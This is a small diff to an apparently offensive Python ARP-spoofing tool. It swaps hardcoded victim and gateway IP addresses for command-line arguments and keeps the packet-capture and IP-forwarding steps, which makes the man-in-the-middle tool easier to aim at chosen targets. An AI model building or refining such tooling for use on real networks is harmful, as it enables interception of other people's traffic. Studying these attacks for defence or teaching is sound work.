@@ -69,7 +69,7 @@ def arp_spoof(victimIP, gatewayIP, interface):
         sys.exit(1)
     
     print(f"Victim MAC Address: {victimMAC}")
-    print(f"Gateway MAC Address: {gatewayMAC}")
+    print(f"Gateway MAC Address: {gatewayMAC}") 
     print("Poisoning Targets...")    
     while True:
         try:
@@ -105,10 +105,13 @@ def capture_packets(victimIP, interface, http_response):
         reARP(victimIP, gatewayIP, interface)
 
 if __name__ == '__main__':
-    interface = 'Ethernet' 
-    victimIP = '192.168.1.106'
-    gatewayIP = '192.168.1.106' 
-    url_to_request = 'http://example.com'
+    if len(sys.argv) != 5:
+        help_text()
+    
+    interface = sys.argv[1]
+    victimIP = sys.argv[2]
+    gatewayIP = sys.argv[3]
+    url_to_request = sys.argv[4]
     
     enable_ip_forwarding()
     
